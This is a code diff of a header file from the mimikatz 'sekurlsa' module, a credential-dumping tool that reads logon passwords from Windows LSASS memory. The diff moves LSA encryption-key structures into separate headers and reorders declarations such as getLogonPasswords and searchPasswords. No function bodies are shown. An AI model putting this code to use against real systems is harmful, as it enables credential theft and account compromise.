@@ -12,6 +12,9 @@
 #include <iostream>
 #include "secpkg.h"
 
+#include "LSA Keys/keys_nt5.h"
+#include "LSA Keys/keys_nt6.h"
+
 #include "Security Packages/msv1_0.h"
 #include "Security Packages/tspkg.h"
 #include "Security Packages/wdigest.h"
@@ -24,50 +27,29 @@ class mod_mimikatz_sekurlsa
 public:
 	typedef bool (WINAPI * PFN_ENUM_BY_LUID) (__in PLUID logId, __in bool justSecurity);
 private:
-	typedef struct _KIWI_BCRYPT_KEY_DATA {
-		DWORD size;
-		DWORD tag;
-		DWORD type;
-		DWORD unk0;
-		DWORD unk1;
-		DWORD unk2;
-		DWORD unk3;
-		PVOID unk4;
-		BYTE data; /* etc... */
-	} KIWI_BCRYPT_KEY_DATA, *PKIWI_BCRYPT_KEY_DATA;
+	typedef struct _KIWI_MODULE_PKG_LSA {
+		wchar_t *	moduleName;
+		wchar_t *	simpleName;
+		PFN_ENUM_BY_LUID	enumFunc;
+		mod_process::PKIWI_VERY_BASIC_MODULEENTRY * pModuleEntry;
+		_KIWI_MODULE_PKG_LSA(wchar_t * leModuleName, wchar_t * leSimpleName, PFN_ENUM_BY_LUID laEnumFunc, mod_process::PKIWI_VERY_BASIC_MODULEENTRY * pLeModuleEntry) : moduleName(leModuleName), simpleName(leSimpleName), enumFunc(laEnumFunc), pModuleEntry(pLeModuleEntry) {}
+	} KIWI_MODULE_PKG_LSA, *PKIWI_MODULE_PKG_LSA;
 
-	typedef struct _KIWI_BCRYPT_KEY {
-		DWORD size;
-		DWORD type;
-		PVOID unk0;
-		PKIWI_BCRYPT_KEY_DATA cle;
-		PVOID unk1;
-	} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;
-
-	/* Crypto NT 5 */
-	static PBYTE *g_pRandomKey, *g_pDESXKey;
-	/* Crypto NT 6 */
-	static PBYTE DES3Key, AESKey;
-	static PKIWI_BCRYPT_KEY * hAesKey, * h3DesKey;
-	static BCRYPT_ALG_HANDLE * hAesProvider, * h3DesProvider;
-	
-	static bool LsaInitializeProtectedMemory_NT6();
-	static bool LsaCleanupProtectedMemory_NT6();
-
-	static bool population;
+	static bool lsassOK;
 	static vector<pair<PFN_ENUM_BY_LUID, wstring>> GLOB_ALL_Providers;
-	static bool getLogonPasswords(vector<wstring> * arguments);
-	static bool searchPasswords(vector<wstring> * arguments);
+	static vector<KIWI_MODULE_PKG_LSA> mesModules;
 
 	static PVOID getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
 	static bool ressembleString(PUNICODE_STRING maChaine, wstring * dstChaine = NULL, BYTE **buffer = NULL);
+
+	static bool getLogonPasswords(vector<wstring> * arguments);
+	static bool searchPasswords(vector<wstring> * arguments);
 public:
 	static HANDLE hLSASS;
-	static HMODULE hLsaSrv, hBCrypt;
-	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModLSASRV;
+	static HMODULE hLsaSrv;
+	static mod_process::KIWI_VERY_BASIC_MODULEENTRY localLSASRV, *pModLSASRV;
 	static PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable;
 
-	static bool searchLSASSDatas();
 	static PLIST_ENTRY getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind);
 	static PVOID getPtrFromAVLByLuid(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
 
@@ -76,6 +58,7 @@ public:
 
 	static bool loadLsaSrv();
 	static bool unloadLsaSrv();
+	static bool searchLSASSDatas();
 
 	static vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> getMimiKatzCommands();
 };
